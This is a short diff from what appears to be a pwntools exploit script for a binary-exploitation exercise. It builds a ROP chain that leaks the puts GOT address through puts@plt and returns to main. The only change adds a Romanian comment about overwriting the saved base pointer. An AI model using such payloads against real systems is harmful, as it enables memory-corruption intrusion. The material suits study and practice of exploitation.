@@ -17,6 +17,7 @@ print(f" AM PRIMIT: {target.recvline()}")
 print(f" AM PRIMIT: {target.recvline()}")
 
 payload = 40 * b"Z"
+# Aici as fi vrut sa ma reintorc la adresa primului call de puts, doar ca eu suprascriu old_rbp ceea ce duce ca gets sa nu mai incarce in &name
 payload += p64(rop_gadget_address, "little") + p64(puts_got_address, "little") + p64(0xc0fec0fe, "little") \
     + p64(puts_plt_address, "little") +  p64(main_address, "little")
 
